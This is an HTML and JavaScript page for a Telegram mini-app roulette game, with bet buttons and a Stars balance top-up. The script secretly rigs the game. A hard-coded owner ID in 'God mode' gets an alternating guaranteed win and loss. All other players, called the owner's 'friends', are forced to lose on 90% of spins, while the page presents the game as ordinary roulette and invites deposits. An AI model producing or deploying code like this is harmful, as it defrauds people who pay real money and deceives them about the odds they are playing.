<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TG Roulette Animation</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background: #1a1a1a;
            color: #ffffff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            user-select: none;
        }
        .casino-box {
            background: #2c2c2c;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        h2 { color: #f1c40f; margin: 0 0 15px 0; }
        
        .roulette-container {
            position: relative;
            width: 100%;
            height: 60px;
            background: #111;
            border: 3px solid #f1c40f;
            border-radius: 8px;
            margin: 20px 0;
            overflow: hidden;
        }
        .pointer {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 4px;
            height: 100%;
            background: #f1c40f;
            z-index: 10;
            box-shadow: 0 0 8px #f1c40f;
        }
        .tape {
            display: flex;
            width: max-content;
            height: 100%;
            transform: translateX(0);
        }
        .cell {
            width: 50px;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            border-right: 1px solid #222;
        }
        .red { background: #e74c3c; }
        .black { background: #2c3e50; }
        .zero { background: #2ecc71; }

        input {
            width: 80%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 2px solid #444;
            background: #111;
            color: #fff;
            font-size: 16px;
            text-align: center;
        }
        .btn-group {
            display: flex;
            gap: 8px;
            margin-bottom: 10px;
        }
        .bet-btn {
            flex: 1;
            padding: 12px 5px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            font-size: 12px;
            transition: 0.2s;
        }
        .bet-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-red { background: #e74c3c; }
        .btn-black { background: #2c3e50; }
        .btn-zero { background: #2ecc71; }
    </style>
</head>
<body>

<div class="casino-box">
    <h2>🎰 РУЛЕТКА 🎰</h2>
    
    <div class="roulette-container">
        <div class="pointer"></div>
        <div class="tape" id="roulette-tape"></div>
    </div>

    <input type="number" id="bet-amount" value="100" min="10">

    <div class="btn-group">
        <button class="bet-btn btn-red" id="b-red" onclick="startSpin('red')">Красное x2</button>
        <button class="bet-btn btn-black" id="b-black" onclick="startSpin('black')">Черное x2</button>
        <button class="bet-btn btn-zero" id="b-zero" onclick="startSpin('zero')">Зеро x35</button>
        <button onclick="triggerTopUp()" style="background: #f1c40f; color: #000; border: none; padding: 5px 10px; font-weight: bold; border-radius: 5px; margin-bottom: 10px; cursor: pointer; font-size: 11px;">➕ Пополнить баланс (⭐) </button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const order = [0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5, 24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26];
    const RED_NUMBERS = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36];
    
    const tape = document.getElementById('roulette-tape');
    const cellWidth = 51; 

    let totalCells = [];
    for (let i = 0; i < 10; i++) { totalCells = totalCells.concat(order); }

    totalCells.forEach(num => {
        const cell = document.createElement('div');
        cell.className = 'cell';
        if (num === 0) {
            cell.classList.add('zero');
        } else if (RED_NUMBERS.includes(num)) {
            cell.classList.add('red');
        } else {
            cell.classList.add('black');
        }
        cell.innerText = num;
        tape.appendChild(cell);
    });

    let adminSpinCount = 0;
    const MY_TELEGRAM_ID = 6252715941; // Твой ID для активации режима Бога
    
    function startSpin(betType) {
        const amount = parseInt(document.getElementById('bet-amount').value);
        if (isNaN(amount) || amount <= 0) { alert('Введите сумму!'); return; }
    
        // Блокируем кнопки на время анимации
        document.querySelectorAll('.bet-btn').forEach(b => b.disabled = true);
    
        // Узнаем ID пользователя, который открыл рулетку прямо сейчас
        const currentUserId = tg.initDataUnsafe?.user?.id;
        let winningNumber;
    
        // 1. ПРОВЕРКА: ЕСЛИ ИГРАЕШЬ ТЫ (АДМИН)
        if (currentUserId === MY_TELEGRAM_ID) {
            adminSpinCount++;
    
            if (adminSpinCount % 2 === 0) {
                // КАЖДЫЙ ВТОРОЙ РАЗ — ГАРАНТИРОВАННЫЙ ВЫИГРЫШ
                let winningNumbers = order.filter(num => {
                    let color = 'black';
                    if (num === 0) color = 'zero';
                    else if (RED_NUMBERS.includes(num)) color = 'red';
                    return color === betType;
                });
                winningNumber = winningNumbers[Math.floor(Math.random() * winningNumbers.length)];
            } else {
                // ПЕРВЫЙ, ТРЕТИЙ И Т.Д. РАЗ — ГАРАНТИРОВАННЫЙ ПРОИГРЫШ
                let losingNumbers = order.filter(num => {
                    let color = 'black';
                    if (num === 0) color = 'zero';
                    else if (RED_NUMBERS.includes(num)) color = 'red';
                    return color !== betType;
                });
                winningNumber = losingNumbers[Math.floor(Math.random() * losingNumbers.length)];
            }
    
        } else {
            // 2. ЕСЛИ ИГРАЮТ ТВОИ ДРУЗЬЯ (Обычные смертные)
            // Ставим жесткий слив: 10% на случайную честную игру, в 90% случаев — подкрученный проигрыш
            const CHANCE = 0.1; 
    
            if (Math.random() > CHANCE) {
                // Жесткая подкрутка на проигрыш
                let losingNumbers = order.filter(num => {
                    let color = 'black';
                    if (num === 0) color = 'zero';
                    else if (RED_NUMBERS.includes(num)) color = 'red';
                    return color !== betType;
                });
                winningNumber = losingNumbers[Math.floor(Math.random() * losingNumbers.length)];
            } else {
                // Редкий честный шанс
                winningNumber = order[Math.floor(Math.random() * order.length)];
            }
        }
    
        // --- АНИМАЦИЯ КРУЧЕНИЯ (Остается прежней) ---
        const targetIndex = order.indexOf(winningNumber) + (37 * 7); 
        const containerWidth = document.querySelector('.roulette-container').offsetWidth;
        const targetX = -(targetIndex * cellWidth - containerWidth / 2 + cellWidth / 2);
    
        tape.style.transition = 'transform 4s cubic-bezier(0.1, 1, 0.1, 1)';
        tape.style.transform = `translateX(${targetX}px)`;
    
        setTimeout(() => {
            const betData = {
                bet_amount: amount,
                bet_type: betType,
                spin_result: winningNumber
            };
            tg.sendData(JSON.stringify(betData));
        }, 4300);
    }

    function triggerTopUp() {
        // Отправляем специальный текст, который бот распарсит как команду
        const topupData = {
            action: "request_topup"
        };
        tg.sendData(JSON.stringify(topupData));
    }
</script>
</body>
</html>
